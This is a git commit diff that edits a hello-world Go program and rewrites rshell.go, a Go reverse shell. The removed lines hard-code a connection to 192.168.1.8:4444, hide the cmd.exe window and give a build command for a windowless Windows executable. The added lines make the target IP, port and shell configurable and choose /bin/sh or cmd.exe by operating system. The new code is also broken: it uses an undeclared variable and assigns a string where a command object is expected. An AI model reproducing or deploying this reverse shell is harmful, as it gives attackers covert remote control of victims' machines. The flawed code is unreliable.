e9fa7a3104486b8619fd511cb90bae86a5a8d961
cyberphor <victor.fernandeziii@gmail.com>
2022-01-12 03:07:46 -0700

    Updated rshell.go

--- hello_world.go
+++ hello_world.go
@@ -5,5 +5,5 @@ import (
 )
 
 func main() {
-    fmt.Print("Hello world!")
+    fmt.Println("Hello World!")
 }
--- rshell.go
+++ rshell.go
@@ -1,17 +1,35 @@
-// HOW TO COMPILE THIS INTO AN EXECUTABLE FILE
-// env GOOS=windows GOARCH=386 go build -ldflags -H=windowsgui rshell.go
 package main
 
 import (
+    "flag"
     "net"
     "os/exec"
-    "syscall"
+    "runtime"
 )
 
 func main() {
-    socket, _ := net.Dial("tcp", "192.168.1.8:4444")
-    rshell := exec.Command("cmd.exe")
-    rshell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    var ip string
+    var port string
+    var shell string
+
+    flag.StringVar(&ip,"ip","127.0.0.1","Remote IP Address")
+    flag.StringVar(&port,"port","4444","Remote Port")
+    flag.StringVar(&shell,"shell","null","Shell")
+    flag.Parse()
+
+    if shell == "null" {
+        switch runtime.GOOS {
+	    case "linux":
+	        rshell = exec.Command("/bin/sh")
+	    case "windows":
+		rshell = exec.Command("cmd.exe")
+        }
+    } else {
+        rshell = shell
+    }
+
+    host := net.ParseIP(ip).String() + ":" + port
+    socket, _ := net.Dial("tcp",host)
     rshell.Stdin = socket
     rshell.Stdout = socket
     rshell.Stderr = socket
